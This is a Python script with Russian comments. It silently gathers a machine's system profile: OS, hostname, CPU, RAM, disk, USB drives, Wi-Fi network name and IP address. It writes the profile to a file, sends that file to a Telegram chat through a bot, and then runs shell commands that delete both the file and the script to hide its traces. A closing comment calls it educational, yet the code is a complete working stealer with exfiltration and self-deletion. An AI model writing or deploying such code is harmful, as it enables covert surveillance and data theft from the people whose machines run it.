import os
import platform
import subprocess
import socket
import telebot
import shutil
import sys
import psutil  

TOKEN = "Your_bot_token"
CHAT_ID = "your_id_chat"

def get_usb_devices():
    devices = []
    system = platform.system()
    if system == "Windows":
        try:
            cmd = "wmic logicaldisk where drivetype=2 get deviceid"
            output = subprocess.check_output(cmd, shell=True, encoding='utf-8').split('\n')
            for line in output[1:]:
                line = line.strip()
                if line:
                    devices.append(line)
        except subprocess.CalledProcessError as e:
            print(f"Ошибка при получении USB устройств: {e}")
    elif system == "Linux":
        try:
            output = subprocess.check_output("lsblk -o NAME,TRAN", shell=True, encoding="utf-8")
            lines = output.splitlines()[1:]  # Пропускаем заголовок
            for line in lines:
                parts = line.split()
                if len(parts) >= 2 and parts[1].lower() == "usb":
                    devices.append("/dev/" + parts[0])
        except subprocess.CalledProcessError as e:
            print(f"Ошибка при получении USB устройств: {e}")
    else:
        print("Неподдерживаемая платформа для получения USB устройств.")
    return devices

def get_ip_address():
    try:
        hostname = socket.gethostname()
        ip_address = socket.gethostbyname(hostname)
        return ip_address
    except Exception as e:
        return f"Не удалось получить IP адрес: {e}"

def get_wifi_name():
    system = platform.system()
    if system == "Windows":
        try:
            wifi_info = subprocess.check_output(["netsh", "wlan", "show", "interface"], encoding='utf-8', errors='ignore')
            for line in wifi_info.split('\n'):
                if "SSID" in line and "BSSID" not in line:
                    return line.split(":")[1].strip()
            return "Wi-Fi не подключен"
        except subprocess.CalledProcessError as e:
            return f"Не удалось получить имя Wi-Fi: {e}"
    elif system == "Linux":
        try:
            if shutil.which("iwgetid"):
                wifi_name = subprocess.check_output(["iwgetid", "-r"], encoding='utf-8').strip()
            elif shutil.which("nmcli"):
                wifi_info = subprocess.check_output(["nmcli", "-t", "-f", "active,ssid", "dev", "wifi"], encoding='utf-8').strip()
                wifi_name = ""
                for line in wifi_info.splitlines():
                    if line.startswith("yes:"):
                        wifi_name = line.split("yes:")[1]
                        break
            else:
                wifi_name = ""
            return wifi_name if wifi_name else "Wi-Fi не подключен"
        except subprocess.CalledProcessError as e:
            return f"Не удалось получить имя Wi-Fi: {e}"
    else:
        return "Неподдерживаемая платформа для Wi-Fi."

def get_cpu_info():
    # Информация о процессоре
    cpu_model = platform.processor() or "Не удалось определить модель CPU"
    cpu_freq = psutil.cpu_freq()
    freq_str = f"{cpu_freq.current:.2f} МГц" if cpu_freq else "N/A"
    cores_logical = psutil.cpu_count(logical=True)
    cores_physical = psutil.cpu_count(logical=False)
    return f"Процессор: {cpu_model}\nЧастота: {freq_str}\nЯдер (физических): {cores_physical}, логических: {cores_logical}"

def get_ram_info():
    # Информация об оперативной памяти
    vm = psutil.virtual_memory()
    total_gb = vm.total / (1024 ** 3)
    available_gb = vm.available / (1024 ** 3)
    return f"ОЗУ: Всего: {total_gb:.2f} ГБ, Доступно: {available_gb:.2f} ГБ"

def get_disk_info():
    # Информация о дисковом пространстве
    system = platform.system()
    if system == "Windows":
        disk_path = os.environ.get("SystemDrive", "C:") + "\\"
    else:
        disk_path = "/"
    du = psutil.disk_usage(disk_path)
    total_gb = du.total / (1024 ** 3)
    used_gb = du.used / (1024 ** 3)
    free_gb = du.free / (1024 ** 3)
    return f"Диск ({disk_path}): Всего: {total_gb:.2f} ГБ, Использовано: {used_gb:.2f} ГБ, Свободно: {free_gb:.2f} ГБ"

def send_file_via_telegram(file_path):
    try:
        bot = telebot.TeleBot(TOKEN)
        with open(file_path, 'rb') as document:
            bot.send_document(CHAT_ID, document)
        print("Файл успешно отправлен через Telegram.")
    except Exception as e:
        print(f"Ошибка при отправке файла через Telegram: {e}")

def schedule_self_deletion(main_file, info_file):
    system = platform.system()
    if system == "Windows":
        deletion_cmd = f'cmd /c "ping 127.0.0.1 -n 3 > nul && del /f /q \"{main_file}\" && del /f /q \"{info_file}\""'
        try:
            subprocess.Popen(deletion_cmd, shell=True)
            print("Запущена команда самоуничтожения (Windows).")
        except Exception as e:
            print(f"Ошибка при запуске команды удаления: {e}")
    else:
        deletion_cmd = f'sh -c "sleep 3 && rm -f \'{main_file}\' \'{info_file}\'"'
        try:
            subprocess.Popen(deletion_cmd, shell=True)
            print("Запущена команда самоуничтожения (Linux/Mac).")
        except Exception as e:
            print(f"Ошибка при запуске команды удаления: {e}")

def main():
    current_dir = os.path.abspath(os.path.dirname(__file__))
    device_info = platform.uname()
    info_file = os.path.join(current_dir, 'device_info.txt')

    with open(info_file, 'w', encoding='utf-8') as file:
        system_language = "English"
        if "Windows" in device_info.system:
            browser = "Chrome"
            system_language = "English" if "en" in device_info.version.lower() else "Russian"
        elif "Linux" in device_info.system:
            browser = "Firefox"
            system_language = "English" if "en" in device_info.version.lower() else "Russian"
        elif "Darwin" in device_info.system:
            browser = "Safari"
            system_language = "English" if "en" in device_info.version.lower() else "Russian"
        else:
            browser = "Unknown"
            
        file.write(f"System: {device_info.system} (Language: {system_language})\n")
        file.write(f"Node Name: {device_info.node}\n")
        file.write(f"Release: {device_info.release}\n")
        file.write(f"Version: {device_info.version}\n")
        file.write(f"Machine: {device_info.machine}\n")
        file.write(f"Browser in use: {browser}\n\n")
        file.write("=== Характеристики ноутбука ===\n")
        file.write(get_cpu_info() + "\n")
        file.write(get_ram_info() + "\n")
        file.write(get_disk_info() + "\n\n")
        
        # USB устройства
        usb_devices = get_usb_devices()
        if usb_devices:
            file.write("USB Devices connected:\n")
            for index, device in enumerate(usb_devices):
                file.write(f"{index + 1}. {device}\n")
            file.write(f"\nNumber of USB devices connected: {len(usb_devices)}\n")
            print("\nUSB Devices connected:")
            for index, device in enumerate(usb_devices):
                print(f"{index + 1}. {device}")
            print(f"\nNumber of USB devices connected: {len(usb_devices)}")
        else:
            file.write("No USB devices connected.\n")

        wifi_name = get_wifi_name()
        file.write(f"\nWi-Fi Network: {wifi_name}\n")
        print(f"Wi-Fi Network: {wifi_name}")
        
        # IP адрес
        ip_address = get_ip_address()
        file.write(f"IP Address: {ip_address}\n")
        print(f"IP Address: {ip_address}")

    print("Информация об устройстве и характеристиках ноутбука сохранена в device_info.txt")

    send_file_via_telegram(info_file)
    
    main_file = os.path.abspath(__file__)
    schedule_self_deletion(main_file, info_file)

if __name__ == '__main__':
    main()

#Программа создана исключительно в образовательнных целях, и не создана для проникновение, нарушение и тп. 

#Программа сделана @ownercodeinov